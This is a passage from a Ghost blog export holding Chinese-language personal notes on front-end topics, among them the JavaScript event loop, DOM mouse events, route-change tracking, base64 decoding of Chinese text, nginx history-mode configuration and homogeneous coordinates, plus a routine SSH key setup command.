f","title":"event loop,macrotask机制,microtask机制 解释","slug":"event-loop-macrotaskji-zhi-microtaskji-zhi-jie-shi","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"macrotask:宏任务，setTimeout。\\nmicrotask:微任务，promise。\\n\\n当js栈上为空，这是读取微任务队列，当microtask（微任务队）列call完清空（js栈上为空），再去读macrotask（宏任务）\\n\\n> 如下面的[例子](https://stackblitz.com/edit/js-4uy9mh?embed=1&file=index.js)\\n\\n```\\n<div class=\\\"outer-test\\\">\\n  <div class=\\\"inner-test\\\">test</div>\\n</div>\\n<div class=\\\"test\\\">test2</div>\\n\\nvar outer = document.querySelector('.outer-test');\\nvar inner = document.querySelector('.inner-test');\\nvar test = document.querySelector('.test');\\n\\nlet log2 = console.log\\n\\nfunction onClick() {\\n  log2('click');\\n\\n  setTimeout(function () {\\n    log2('timeout');\\n  }, 0);\\n\\n  Promise.resolve().then(function () {\\n    log2('promise');\\n  });\\n}\\n\\ninner.addEventListener('click', onClick);\\nouter.addEventListener('click', onClick);\\n\\ntest.addEventListener('click', () => {\\n  inner.click()\\n})\\n```\\n点test 和 test2 的区别。点击test2,在第一次输出click后，js栈上不为空，因为它是 () => {\\n  inner.click()\\n})调用的，因此不会立即调用microtask（微任务）。等到冒泡完成，然后去执行。\\n\\ntest2 输出如下\\n```\\nclick\\nclick\\npromise\\npromise\\nsetTimeout\\nsetTimeout\\n```\\n\\n[https://jakearchibald.com/2015/tasks-microtasks-queues-and-schedules/](https://jakearchibald.com/2015/tasks-microtasks-queues-and-schedules/)\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>macrotask:宏任务，setTimeout。<br>\nmicrotask:微任务，promise。</p>\n<p>当js栈上为空，这是读取微任务队列，当microtask（微任务队）列call完清空（js栈上为空），再去读macrotask（宏任务）</p>\n<blockquote>\n<p>如下面的<a href=\"https://stackblitz.com/edit/js-4uy9mh?embed=1&amp;file=index.js\">例子</a></p>\n</blockquote>\n<pre><code>&lt;div class=&quot;outer-test&quot;&gt;\n  &lt;div class=&quot;inner-test&quot;&gt;test&lt;/div&gt;\n&lt;/div&gt;\n&lt;div class=&quot;test&quot;&gt;test2&lt;/div&gt;\n\nvar outer = document.querySelector('.outer-test');\nvar inner = document.querySelector('.inner-test');\nvar test = document.querySelector('.test');\n\nlet log2 = console.log\n\nfunction onClick() {\n  log2('click');\n\n  setTimeout(function () {\n    log2('timeout');\n  }, 0);\n\n  Promise.resolve().then(function () {\n    log2('promise');\n  });\n}\n\ninner.addEventListener('click', onClick);\nouter.addEventListener('click', onClick);\n\ntest.addEventListener('click', () =&gt; {\n  inner.click()\n})\n</code></pre>\n<p>点test 和 test2 的区别。点击test2,在第一次输出click后，js栈上不为空，因为它是 () =&gt; {<br>\ninner.click()<br>\n})调用的，因此不会立即调用microtask（微任务）。等到冒泡完成，然后去执行。</p>\n<p>test2 输出如下</p>\n<pre><code>click\nclick\npromise\npromise\nsetTimeout\nsetTimeout\n</code></pre>\n<p><a href=\"https://jakearchibald.com/2015/tasks-microtasks-queues-and-schedules/\">https://jakearchibald.com/2015/tasks-microtasks-queues-and-schedules/</a></p>\n<!--kg-card-end: markdown-->","comment_id":"141","plaintext":"macrotask:宏任务，setTimeout。\nmicrotask:微任务，promise。\n\n当js栈上为空，这是读取微任务队列，当microtask（微任务队）列call完清空（js栈上为空），再去读macrotask（宏任务）\n\n> 如下面的例子 [https://stackblitz.com/edit/js-4uy9mh?embed=1&file=index.js]\n\n\n<div class=\"outer-test\">\n  <div class=\"inner-test\">test</div>\n</div>\n<div class=\"test\">test2</div>\n\nvar outer = document.querySelector('.outer-test');\nvar inner = document.querySelector('.inner-test');\nvar test = document.querySelector('.test');\n\nlet log2 = console.log\n\nfunction onClick() {\n  log2('click');\n\n  setTimeout(function () {\n    log2('timeout');\n  }, 0);\n\n  Promise.resolve().then(function () {\n    log2('promise');\n  });\n}\n\ninner.addEventListener('click', onClick);\nouter.addEventListener('click', onClick);\n\ntest.addEventListener('click', () => {\n  inner.click()\n})\n\n\n点test 和 test2 的区别。点击test2,在第一次输出click后，js栈上不为空，因为它是 () => {\ninner.click()\n})调用的，因此不会立即调用microtask（微任务）。等到冒泡完成，然后去执行。\n\ntest2 输出如下\n\nclick\nclick\npromise\npromise\nsetTimeout\nsetTimeout\n\n\nhttps://jakearchibald.com/2015/tasks-microtasks-queues-and-schedules/","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-01-27T14:53:33.000Z","created_by":"1","updated_at":"2018-07-17T06:01:11.000Z","updated_by":"1","published_at":"2018-07-16T11:27:04.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d34a","uuid":"4844fd85-5e50-414b-93b9-fd00fd327f36","title":"mouseenter、mouseover；mouseleave、mouseout的区别","slug":"mouseenter-mouseover-mouseleave-mouseoutde-qu-bie","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"mouseover/mouseout的事件会冒泡（event bubbling），而mouseenter/mouseleave不会发生事件冒泡\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>mouseover/mouseout的事件会冒泡（event bubbling），而mouseenter/mouseleave不会发生事件冒泡</p>\n<!--kg-card-end: markdown-->","comment_id":"142","plaintext":"mouseover/mouseout的事件会冒泡（event bubbling），而mouseenter/mouseleave不会发生事件冒泡","feature_image":null,"featured":0,"type":"post","status":"draft","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-02-23T06:18:14.000Z","created_by":"1","updated_at":"2018-02-23T06:19:41.000Z","updated_by":"1","published_at":null,"published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d34b","uuid":"303aa1e7-947e-42c3-9636-fa0c9ef0b199","title":"监听路由跳转","slug":"jian-ting-lu-you-tiao-zhuan","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"最近要写一个前端统计的项目，需要监听页面跳转\\n```\\n     private captureRouteChange() {\\n        if (this.option.useHash) {\\n            window.addEventListener('hashchange', (e) => {\\n                this.changeURL({\\n                    currURL: e.newURL,\\n                    oldURL: e.oldURL\\n                });\\n            }, false);\\n        } else {\\n            ((history) => {\\n                // 覆盖 history.pushState 方法\\n                const pushState = history.pushState;\\n                history.pushState = (...args) => {\\n                    let oldURL = window.location.href;\\n                    const res = pushState.apply(history, args);\\n                    this.changeURL({\\n                        currURL: window.location.href,\\n                        oldURL\\n                    });\\n                    return res;\\n                };\\n                const back = history.back;\\n\\n                let oldURL = window.location.href;\\n                history.back = (...args) => {\\n                    oldURL = window.location.href;\\n                    const res = back.apply(history, args);\\n                };\\n                window.addEventListener('popstate', (event) => {\\n                    this.changeURL({\\n                        currURL: window.location.href,\\n                        oldURL\\n                    });\\n                    oldURL = window.location.href;\\n                });\\n            })(window.history);\\n\\n        }\\n    }\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>最近要写一个前端统计的项目，需要监听页面跳转</p>\n<pre><code>     private captureRouteChange() {\n        if (this.option.useHash) {\n            window.addEventListener('hashchange', (e) =&gt; {\n                this.changeURL({\n                    currURL: e.newURL,\n                    oldURL: e.oldURL\n                });\n            }, false);\n        } else {\n            ((history) =&gt; {\n                // 覆盖 history.pushState 方法\n                const pushState = history.pushState;\n                history.pushState = (...args) =&gt; {\n                    let oldURL = window.location.href;\n                    const res = pushState.apply(history, args);\n                    this.changeURL({\n                        currURL: window.location.href,\n                        oldURL\n                    });\n                    return res;\n                };\n                const back = history.back;\n\n                let oldURL = window.location.href;\n                history.back = (...args) =&gt; {\n                    oldURL = window.location.href;\n                    const res = back.apply(history, args);\n                };\n                window.addEventListener('popstate', (event) =&gt; {\n                    this.changeURL({\n                        currURL: window.location.href,\n                        oldURL\n                    });\n                    oldURL = window.location.href;\n                });\n            })(window.history);\n\n        }\n    }\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"143","plaintext":"最近要写一个前端统计的项目，需要监听页面跳转\n\n     private captureRouteChange() {\n        if (this.option.useHash) {\n            window.addEventListener('hashchange', (e) => {\n                this.changeURL({\n                    currURL: e.newURL,\n                    oldURL: e.oldURL\n                });\n            }, false);\n        } else {\n            ((history) => {\n                // 覆盖 history.pushState 方法\n                const pushState = history.pushState;\n                history.pushState = (...args) => {\n                    let oldURL = window.location.href;\n                    const res = pushState.apply(history, args);\n                    this.changeURL({\n                        currURL: window.location.href,\n                        oldURL\n                    });\n                    return res;\n                };\n                const back = history.back;\n\n                let oldURL = window.location.href;\n                history.back = (...args) => {\n                    oldURL = window.location.href;\n                    const res = back.apply(history, args);\n                };\n                window.addEventListener('popstate', (event) => {\n                    this.changeURL({\n                        currURL: window.location.href,\n                        oldURL\n                    });\n                    oldURL = window.location.href;\n                });\n            })(window.history);\n\n        }\n    }","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-02-24T10:00:58.000Z","created_by":"1","updated_at":"2018-03-01T07:10:04.000Z","updated_by":"1","published_at":"2018-02-24T10:01:23.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d34c","uuid":"cc04656f-91fa-4e17-8564-7285f6c928ed","title":"react学习","slug":"reactxue-xi","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"去年看了很多react底层实现的文章，写了一个mini版的react，还有svg渲染模式等没完善。今天过年来了把它完善了。主要实现react api，和其他类react的库对比，把合成事件加上了，兼容性很好（preact是没合成事件的)。\\n\\n> GITHUB\\n\\n* [learn-react](https://github.com/laopo001/learn-react) react\\n* [antd](https://github.com/laopo001/ant-design) fork的antd源码，改了下配置跑起来，基本完美。（除了有一个用了jq的地方表现形式不一样。我的react在diff的时候，是直接跳过非自己渲染的dom）\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>去年看了很多react底层实现的文章，写了一个mini版的react，还有svg渲染模式等没完善。今天过年来了把它完善了。主要实现react api，和其他类react的库对比，把合成事件加上了，兼容性很好（preact是没合成事件的)。</p>\n<blockquote>\n<p>GITHUB</p>\n</blockquote>\n<ul>\n<li><a href=\"https://github.com/laopo001/learn-react\">learn-react</a> react</li>\n<li><a href=\"https://github.com/laopo001/ant-design\">antd</a> fork的antd源码，改了下配置跑起来，基本完美。（除了有一个用了jq的地方表现形式不一样。我的react在diff的时候，是直接跳过非自己渲染的dom）</li>\n</ul>\n<!--kg-card-end: markdown-->","comment_id":"144","plaintext":"去年看了很多react底层实现的文章，写了一个mini版的react，还有svg渲染模式等没完善。今天过年来了把它完善了。主要实现react\napi，和其他类react的库对比，把合成事件加上了，兼容性很好（preact是没合成事件的)。\n\n> GITHUB\n\n\n * learn-react [https://github.com/laopo001/learn-react] react\n * antd [https://github.com/laopo001/ant-design] \n   fork的antd源码，改了下配置跑起来，基本完美。（除了有一个用了jq的地方表现形式不一样。我的react在diff的时候，是直接跳过非自己渲染的dom）","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-03-12T03:21:10.000Z","created_by":"1","updated_at":"2018-03-12T03:31:34.000Z","updated_by":"1","published_at":"2018-03-12T03:31:34.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d34d","uuid":"2014ee07-bea0-436a-a5ad-01eca5e42349","title":"linux","slug":"linux-3","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"```\\ncat ~/.ssh/dadigua/id_rsa.pub | ssh root@dadigua.win \\\"mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys\\\"\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><pre><code>cat ~/.ssh/dadigua/id_rsa.pub | ssh root@dadigua.win &quot;mkdir -p ~/.ssh &amp;&amp; cat &gt;&gt; ~/.ssh/authorized_keys&quot;\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"145","plaintext":"cat ~/.ssh/dadigua/id_rsa.pub | ssh root@dadigua.win \"mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys\"","feature_image":null,"featured":0,"type":"post","status":"draft","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-03-15T08:07:43.000Z","created_by":"1","updated_at":"2018-03-15T08:08:07.000Z","updated_by":"1","published_at":null,"published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d34e","uuid":"3fe1ead1-355c-45e9-b6cf-f7163d2a4e26","title":"Javascript 中 atob 方法解码中文字符乱码","slug":"untitled-5","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"Uncaught DOMException: Failed to execute 'btoa' on 'Window': The string to be encoded contains characters outside of the Latin1 range.\\n\\n> 1.借助 encodeURIComponent 和 decodeURIComponent 转义非中文字符\\n```\\n编码\\n\\n> window.btoa(encodeURIComponent('中文'))\\n\\\"JUU0JUI4JUFEJUU2JTk2JTg3\\\"\\n解码\\n\\n> decodeURIComponent(window.atob('JUU0JUI4JUFEJUU2JTk2JTg3'))\\n\\\"中文\\\"\\n```\\n> 2.第三方 Base64 工具\\n\\nhttps://gitee.com/loonhxl/jbase64/blob/master/jbase64.js\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>Uncaught DOMException: Failed to execute 'btoa' on 'Window': The string to be encoded contains characters outside of the Latin1 range.</p>\n<blockquote>\n<p>1.借助 encodeURIComponent 和 decodeURIComponent 转义非中文字符</p>\n</blockquote>\n<pre><code>编码\n\n&gt; window.btoa(encodeURIComponent('中文'))\n&quot;JUU0JUI4JUFEJUU2JTk2JTg3&quot;\n解码\n\n&gt; decodeURIComponent(window.atob('JUU0JUI4JUFEJUU2JTk2JTg3'))\n&quot;中文&quot;\n</code></pre>\n<blockquote>\n<p>2.第三方 Base64 工具</p>\n</blockquote>\n<p><a href=\"https://gitee.com/loonhxl/jbase64/blob/master/jbase64.js\">https://gitee.com/loonhxl/jbase64/blob/master/jbase64.js</a></p>\n<!--kg-card-end: markdown-->","comment_id":"146","plaintext":"Uncaught DOMException: Failed to execute 'btoa' on 'Window': The string to be\nencoded contains characters outside of the Latin1 range.\n\n> 1.借助 encodeURIComponent 和 decodeURIComponent 转义非中文字符\n\n\n编码\n\n> window.btoa(encodeURIComponent('中文'))\n\"JUU0JUI4JUFEJUU2JTk2JTg3\"\n解码\n\n> decodeURIComponent(window.atob('JUU0JUI4JUFEJUU2JTk2JTg3'))\n\"中文\"\n\n\n> 2.第三方 Base64 工具\n\n\nhttps://gitee.com/loonhxl/jbase64/blob/master/jbase64.js","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-04-02T09:44:50.000Z","created_by":"1","updated_at":"2018-04-02T09:48:26.000Z","updated_by":"1","published_at":"2018-04-02T09:48:23.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d34f","uuid":"9a455cca-6499-434f-888f-d1118066fc0f","title":"h5 history nginx配置","slug":"h5-history-nginxpei-zhi","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"server {\\n        listen 80;\\n        server_name  www.m-example.com;\\n        root   \\\"xxx\\\";\\n        location / {\\n            try_files $uri $uri/ /index.html =404;\\n        }\\n}\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>server {<br>\nlisten 80;<br>\nserver_name  www.m-example.com;<br>\nroot   &quot;xxx&quot;;<br>\nlocation / {<br>\ntry_files $uri $uri/ /index.html =404;<br>\n}<br>\n}</p>\n<!--kg-card-end: markdown-->","comment_id":"147","plaintext":"server {\nlisten 80;\nserver_name www.m-example.com;\nroot \"xxx\";\nlocation / {\ntry_files $uri $uri/ /index.html =404;\n}\n}","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-04-08T07:24:57.000Z","created_by":"1","updated_at":"2018-04-08T07:25:23.000Z","updated_by":"1","published_at":"2018-04-08T07:25:23.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d350","uuid":"a1bbe804-785e-4ab5-b247-ccc89338ae63","title":"webgl","slug":"untitled-6","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"![](/content/images/2018/05/1.png)\\n![](/content/images/2018/05/2.png)\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p><img src=\"/content/images/2018/05/1.png\" alt=\"\"><br>\n<img src=\"/content/images/2018/05/2.png\" alt=\"\"></p>\n<!--kg-card-end: markdown-->","comment_id":"148","plaintext":null,"feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-05-06T07:07:34.000Z","created_by":"1","updated_at":"2018-05-06T07:11:14.000Z","updated_by":"1","published_at":"2018-05-06T07:08:05.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d351","uuid":"59bcd382-dea6-4018-8fd6-358d1a61ac46","title":"齐次坐标理解","slug":"qi-ci-zuo-biao-xue-xi","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"齐次坐标就是将一个原本是n维的向量用一个n+1维向量来表示，是指一个用于投影几何里的坐标系统，如同用于欧氏几何里的笛卡儿坐标一般。\\n\\n二维点(x,y)的齐次坐标表示为(hx,hy,h)，由此可以看出，一个向量的齐次表示是不唯一的，齐次坐标的h取不同的值都表示的是同一个点，比如齐次坐标(8,4,2)、(4,2,1)表示的都是二维点(4,2)。\\n\\n给出点的齐次表达式[X Y H]，就可求得其二维笛卡尔坐标，即[X Y H]→= [x y 1]， 这个过程称为归一化处理。\\n\\n引进齐次坐标有什么必要，它有什么优点呢？\\n\\n许多图形应用涉及到几何变换，主要包括平移、旋转、缩放。以矩阵表达式来计算这些变换时，平移是矩阵相加，旋转和缩放则是矩阵相乘，综合起来可以表示为p' = m1*p+ m2（注：因为习惯的原因，实际使用时一般使用变化矩阵左乘向量）(m1旋转缩放矩阵， m2为平移矩阵， p为原向量 ，p'为变换后的向量)。引入齐次坐标的目的主要是合并矩阵运算中的乘法和加法，表示为p' = p*M的形式。即它提供了用矩阵运算把二维、三维甚至高维空间中的一个点集从一个坐标系变换到另一个坐标系的有效方法。\\n\\n问题：两条平行线可以相交于一点\\n\\n* 在欧氏几何空间，同一平面的两条平行线不能相交，这是我们都熟悉的一种场景。\\n* 然而，在透视空间里面，两条平行线可以相交，例如：火车轨道随着我们的视线越来越窄，最后两条平行线在无穷远处交于一点。\\n\\n\\n欧氏空间（或者笛卡尔空间）描述2D/3D几何非常适合，但是这种方法却不适合处理透视空间的问题（实际上，欧氏几何是透视几何的一个子集合），2维笛卡尔坐标可以表示为（x,y）。\\n\\n如果一个点在无穷远处，这个点的坐标将会(∞,∞)，在欧氏空间，这变得没有意义。平行线在透视空间的无穷远处交于一点，但是在欧氏空间却不能，数学家发现了一种方式来解决这个问题。\\n\\n[摘自](https://blog.csdn.net/jeffasd/article/details/77944822)\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>齐次坐标就是将一个原本是n维的向量用一个n+1维向量来表示，是指一个用于投影几何里的坐标系统，如同用于欧氏几何里的笛卡儿坐标一般。</p>\n<p>二维点(x,y)的齐次坐标表示为(hx,hy,h)，由此可以看出，一个向量的齐次表示是不唯一的，齐次坐标的h取不同的值都表示的是同一个点，比如齐次坐标(8,4,2)、(4,2,1)表示的都是二维点(4,2)。</p>\n<p>给出点的齐次表达式[X Y H]，就可求得其二维笛卡尔坐标，即[X Y H]→= [x y 1]， 这个过程称为归一化处理。</p>\n<p>引进齐次坐标有什么必要，它有什么优点呢？</p>\n<p>许多图形应用涉及到几何变换，主要包括平移、旋转、缩放。以矩阵表达式来计算这些变换时，平移是矩阵相加，旋转和缩放则是矩阵相乘，综合起来可以表示为p' = m1<em>p+ m2（注：因为习惯的原因，实际使用时一般使用变化矩阵左乘向量）(m1旋转缩放矩阵， m2为平移矩阵， p为原向量 ，p'为变换后的向量)。引入齐次坐标的目的主要是合并矩阵运算中的乘法和加法，表示为p' = p</em>M的形式。即它提供了用矩阵运算把二维、三维甚至高维空间中的一个点集从一个坐标系变换到另一个坐标系的有效方法。</p>\n<p>问题：两条平行线可以相交于一点</p>\n<ul>\n<li>在欧氏几何空间，同一平面的两条平行线不能相交，这是我们都熟悉的一种场景。</li>\n<li>然而，在透视空间里面，两条平行线可以相交，例如：火车轨道随着我们的视线越来越窄，最后两条平行线在无穷远处交于一点。</li>\n</ul>\n<p>欧氏空间（或者笛卡尔空间）描述2D/3D几何非常适合，但是这种方法却不适合处理透视空间的问题（实际上，欧氏几何是透视几何的一个子集合），2维笛卡尔坐标可以表示为（x,y）。</p>\n<p>如果一个点在无穷远处，这个点的坐标将会(∞,∞)，在欧氏空间，这变得没有意义。平行线在透视空间的无穷远处交于一点，但是在欧氏空间却不能，数学家发现了一种方式来解决这个问题。</p>\n<p><a href=\"https://blog.csdn.net/jeffasd/article/details/77944822\">摘自</a></p>\n<!--kg-card-end: markdown-->","comment_id":"149","plaintext":"齐次坐标就是将一个原本是n维的向量用一个n+1维向量来表示，是指一个用于投影几何里的坐标系统，如同用于欧氏几何里的笛卡儿坐标一般。\n\n二维点(x,y)的齐次坐标表示为(hx,hy,h)，由此可以看出，一个向量的齐次表示是不唯一的，齐次坐标的h取不同的值都表示的是同一个点，比如齐次坐标(8,4,2)、(4,2,1)表示的都是二维点(4,2)。\n\n给出点的齐次表达式[X Y H]，就可求得其二维笛卡尔坐标，即[X Y H]→= [x y 1]， 这个过程称为归一化处理。\n\n引进齐次坐标有什么必要，它有什么优点呢？\n\n许多图形应用涉及到几何变换，主要包括平移、旋转、缩放。以矩阵表达式来计算这些变换时，平移是矩阵相加，旋转和缩放则是矩阵相乘，综合起来可以表示为p' = m1p+\nm2（注：因为习惯的原因，实际使用时一般使用变化矩阵左乘向量）(m1旋转缩放矩阵， m2为平移矩阵， p为原向量\n，p'为变换后的向量)。引入齐次坐标的目的主要是合并矩阵运算中的乘法和加法，表示为p' = p\nM的形式。即它提供了用矩阵运算把二维、三维甚至高维空间中的一个点集从一个坐标系变换到另一个坐标系的有效方法。\n\n问题：两条平行线可以相交于一点\n\n * 在欧氏几何空间，同一平面的两条平行线不能相交，这是我们都熟悉的一种场景。\n * 然而，在透视空间里面，两条平行线可以相交，例如：火车轨道随着我们的视线越来越窄，最后两条平行线在无穷远处交于一点。\n\n欧氏空间（或者笛卡尔空间）描述2D/3D几何非常适合，但是这种方法却不适合处理透视空间的问题（实际上，欧氏几何是透视几何的一个子集合），2维笛卡尔坐标可以表示为（x,y）。\n\n如果一个点在无穷远处，这个点的坐标将会(∞,∞)，在欧氏空间，这变得没有意义。平行线在透视空间的无穷远处交于一点，但是在欧氏空间却不能，数学家发现了一种方式来解决这个问题。\n\n摘自 [https://blog.csdn.net/jeffasd/article/details/77944822]","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-05-07T04:20:54.000Z","created_by":"1","updated_at":"2018-05-07T05:22:53.000Z","updated_by":"1","published_at":"2018-05-07T05:22:53.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d352","uuid":"ef4796a6-0827-4a4f-b50e-195d79c39bd6","title":"pageX,clientX,screenX,offsetX   区别","slug":"pagex-clientx-screenx-offsetxqu-bie","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"##### 鼠标事件上坐标\\n\\n> pageX/pageY:\\n\\n鼠标相对于整个页面的X/Y坐标。\\n注意，整个页面的意思就是你整个网页的全部，比如说网页很宽很长，宽2000px，高3000px，那pageX,pageY的最大值就是它们了。\\n特别说明：IE不支持！\\n\\n> clientX/clientY：\\n\\n事件发生时鼠标在浏览器内容区域的X/Y坐标（不包含滚动条）。\\n浏览器内容区域即浏览器窗口中用来显示网页的可视区域，注意这个可视，也就是说需要拖动滚动条才能看到的区域不算。\\n当你将浏览器窗口缩小时，clientX/clientY的最大值也会缩小，但始终，它们的最大值不会超过你浏览器可视区域。\\n特别说明：IE下此属性不规范，它们的最小值不是0而是2，也就是说IE下的clientX/clientY比火狐下始终大2px。\\n\\n> screenX/screenY\\n\\n鼠标在屏幕上的坐标。screenX,screenY的最大值不会超过屏幕分辨率。\\n> offsetX/offsetY:\\n\\n得出的结果跟pageX/pageY一样，既然如此，它有什么存在价值？因为：\\n特别说明：只有IE支持！相当于IE下的pageX,pageY。\\n\\ne.clientX + document.documentElement.scrollLeft - document.documentElement.clientLeft = e.pageX\\ne.clientY + document.documentElement.scrollTop  - document.documentElement.clientTop = e.pageY\\n\\n##### 滚动高度\\n为了跨浏览器兼容，请使用 window.pageYOffset 代替 window.scrollY;\\nIE（<9）两个属性都不支持;\\nsafari不支持document.documentElement.scrollTop;\\n下面的兼容写法\\n\\nlet scrollTop = document.documentElement.scrollTop || window.pageYOffset || document.body.scrollTop;\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><h5 id=\"\">鼠标事件上坐标</h5>\n<blockquote>\n<p>pageX/pageY:</p>\n</blockquote>\n<p>鼠标相对于整个页面的X/Y坐标。<br>\n注意，整个页面的意思就是你整个网页的全部，比如说网页很宽很长，宽2000px，高3000px，那pageX,pageY的最大值就是它们了。<br>\n特别说明：IE不支持！</p>\n<blockquote>\n<p>clientX/clientY：</p>\n</blockquote>\n<p>事件发生时鼠标在浏览器内容区域的X/Y坐标（不包含滚动条）。<br>\n浏览器内容区域即浏览器窗口中用来显示网页的可视区域，注意这个可视，也就是说需要拖动滚动条才能看到的区域不算。<br>\n当你将浏览器窗口缩小时，clientX/clientY的最大值也会缩小，但始终，它们的最大值不会超过你浏览器可视区域。<br>\n特别说明：IE下此属性不规范，它们的最小值不是0而是2，也就是说IE下的clientX/clientY比火狐下始终大2px。</p>\n<blockquote>\n<p>screenX/screenY</p>\n</blockquote>\n<p>鼠标在屏幕上的坐标。screenX,screenY的最大值不会超过屏幕分辨率。</p>\n<blockquote>\n<p>offsetX/offsetY:</p>\n</blockquote>\n<p>得出的结果跟pageX/pageY一样，既然如此，它有什么存在价值？因为：<br>\n特别说明：只有IE支持！相当于IE下的pageX,pageY。</p>\n<p>e.clientX + document.documentElement.scrollLeft - document.documentElement.clientLeft = e.pageX<br>\ne.clientY + document.documentElement.scrollTop  - document.documentElement.clientTop = e.pageY</p>\n<h5 id=\"\">滚动高度</h5>\n<p>为了跨浏览器兼容，请使用 window.pageYOffset 代替 window.scrollY;<br>\nIE（&lt;9）两个属性都不支持;<br>\nsafari不支持document.documentElement.scrollTop;<br>\n下面的兼容写法</p>\n<p>let scrollTop = document.documentElement.scrollTop || window.pageYOffset || document.body.scrollTop;</p>\n<!--kg-card-end: markdown-->","comment_id":"150","plaintext":"鼠标事件上坐标\n> pageX/pageY:\n\n\n鼠标相对于整个页面的X/Y坐标。\n注意，整个页面的意思就是你整个网页的全部，比如说网页很宽很长，宽2000px，高3000px，那pageX,pageY的最大值就是它们了。\n特别说明：IE不支持！\n\n> clientX/clientY：\n\n\n事件发生时鼠标在浏览器内容区域的X/Y坐标（不包含滚动条）。\n浏览器内容区域即浏览器窗口中用来显示网页的可视区域，注意这个可视，也就是说需要拖动滚动条才能看到的区域不算。\n当你将浏览器窗口缩小时，clientX/clientY的最大值也会缩小，但始终，它们的最大值不会超过你浏览器可视区域。\n特别说明：IE下此属性不规范，它们的最小值不是0而是2，也就是说IE下的clientX/clientY比火狐下始终大2px。\n\n> screenX/screenY\n\n\n鼠标在屏幕上的坐标。screenX,screenY的最大值不会超过屏幕分辨率。\n\n> offsetX/offsetY:\n\n\n得出的结果跟pageX/pageY一样，既然如此，它有什么存在价值？因为：\n特别说明：只有IE支持！相当于IE下的pageX,pageY。\n\ne.clientX + document.documentElement.scrollLeft -\ndocument.documentElement.clientLeft = 